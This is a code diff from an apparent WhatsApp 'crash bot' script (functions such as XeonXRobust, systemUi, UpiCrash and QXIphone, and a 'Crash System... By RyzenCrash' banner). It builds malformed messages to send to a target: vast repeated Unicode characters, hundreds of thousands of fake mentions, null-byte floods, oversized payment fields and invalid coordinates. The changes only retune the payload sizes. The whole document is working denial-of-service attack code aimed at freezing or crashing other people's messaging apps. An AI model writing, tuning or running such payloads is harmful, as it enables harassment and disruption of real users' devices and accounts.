@@ -1248,7 +1248,7 @@ bot.command("status", ctx => {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: "\u8746" + "ꦾ".repeat(50000) + "@ꦾ".repeat(50000) + "𑲭𑲭𑲭".repeat(50000) + "ᬃᬃ".repeat(50000) + "⿻".repeat(50000)
+                                text: "\u8746" + "ꦾ".repeat(50000) + "@ꦾ".repeat(50000) + "𑲭𑲭𑲭".repeat(50000) + "ᬃᬃ".repeat(50000)
                             },
                             nativeFlowMessage: {},
                             contextInfo: {
@@ -1288,7 +1288,7 @@ bot.command("status", ctx => {
           conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
           conversionDelaySeconds: 10,
           forwardingScore: 10,
-          isForwarded: false,
+          isForwarded: true,
           quotedAd: {
             advertiserName: " X ",
             mediaType: "IMAGE",
@@ -1361,7 +1361,7 @@ console.log(chalk.red.bold('Crash System(2) Device By ☆ RyzenCrash'))
 };
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(10200);
-  const ui = "ꦽ".repeat(150000);
+  const ui = "ꦽ".repeat(80000);
   await cella.relayMessage(target, {
     ephemeralMessage: {
       message: {
@@ -1396,7 +1396,7 @@ async function XeonXRobust(target, Ptcp = true) {
           nativeFlowMessage: {},
           contextInfo: {
             mentionedJid: ["0@s.whatsapp.net", ...Array.from({
-              length: 300000
+              length: 90000
             }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
             forwardingScore: 1,
             isForwarded: true,
@@ -1601,7 +1601,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@ྫྷ".repeat(100000
 								},
 								nativeFlowMessage: {
 								name: "call_permission_request",
-								messageParamsJson: "\u0000".repeat(500000),
+								messageParamsJson: "\u0000".repeat(10000),
 								},
 								contextInfo: {
 								mentionedJid: ["0@s.whatsapp.net"],
@@ -1761,7 +1761,7 @@ async function systemUi(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Please.." + "ꦾ".repeat(90000) + "@ꦾ ".repeat(100000)
+                        text: "Please.." + "ꦾ".repeat(90000) + "ꦾ@".repeat(100000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -1787,7 +1787,7 @@ async function systemUi(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Wanna With Yours. :D" + "ꦾ".repeat(300000)
+                        text: "Wanna With Yours. :D" + "ꦾ@§".repeat(100000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -1824,7 +1824,7 @@ async function UpiCrash(target) {
         target,
         {
           paymentInviteMessage: {
-            serviceType: "VENMO".repeat(150000),
+            serviceType: "VENMO",
             expiryTimestamp: Date.now() + 5184000000,
           },
         },
@@ -1842,7 +1842,7 @@ async function UpiCrash(target) {
         target,
         {
           paymentInviteMessage: {
-            serviceType: "CASHAPP".repeat(15000),
+            serviceType: "CASHAPP",
             expiryTimestamp: Date.now() + 5184000000,
           },
         },
@@ -1860,7 +1860,7 @@ async function UpiCrash(target) {
         target,
         {
           paymentInviteMessage: {
-            serviceType: "SAMSUNGPAY".repeat(10000),
+            serviceType: "SAMSUNGPAY",
             expiryTimestamp: Date.now() + 5184000000,
           },
         },
@@ -1879,7 +1879,7 @@ async function newsLetter(target) {
             {
              newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(140000),
+                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "@ી".repeat(80000),
                                 jpegThumbnail: "",
                                 caption: "ꦽ".repeat(160000),
                                 inviteExpiration: Date.now() + 1814400000,
@@ -1899,7 +1899,7 @@ async function newsLetter(target) {
         target,
         {
           paymentInviteMessage: {
-            serviceType: "SQUARE".repeat(100),
+            serviceType: "SQUARE",
             expiryTimestamp: Date.now() + 5184000000,
           },
         },
@@ -1931,7 +1931,7 @@ async function newsLetter(target) {
     }
 
     async function QXIphone(target) {
-      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(50000);
+      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(20000);
       await cella.relayMessage(
         target,
         {
@@ -1939,7 +1939,7 @@ async function newsLetter(target) {
             degreesLatitude: 999.03499999999999,
             degreesLongitude: -999.03499999999999,
             name: CrashQAiphone,
-            url: "https://t.me/cellasta",
+            url: CrashQAiphone,
           },
         },
         {
@@ -2032,7 +2032,7 @@ async function newsLetter(target) {
         target,
         {
           extendedTextMessage: {
-            text: "Wanna With Yours :)" + "ꦾ@".repeat(900000),
+            text: "Wanna With Yours :)" + "ꦾ@".repeat(90000),
             contextInfo: {
               stanzaId: "1234567890ABCDEF",
               participant: "0@s.whatsapp.net",
@@ -2074,7 +2074,7 @@ async function newsLetter(target) {
                 "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
               externalAdReply: {
                 title: "Ueheheheeh",
-                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(100000),
+                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(70000),
                 mediaType: "VIDEO",
                 renderLargerThumbnail: true,
                 previewTtpe: "VIDEO",
@@ -2142,13 +2142,13 @@ async function newsLetter(target) {
         target,
         {
           extendedTextMessage: {
-            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
+            text: `Wanna With Yours :D -` + "ꦾ@".repeat(90000),
             contextInfo: {
               fromMe: false,
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
+                conversation: "Gpp Yah:D ‌" + "ꦾ@".repeat(60000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
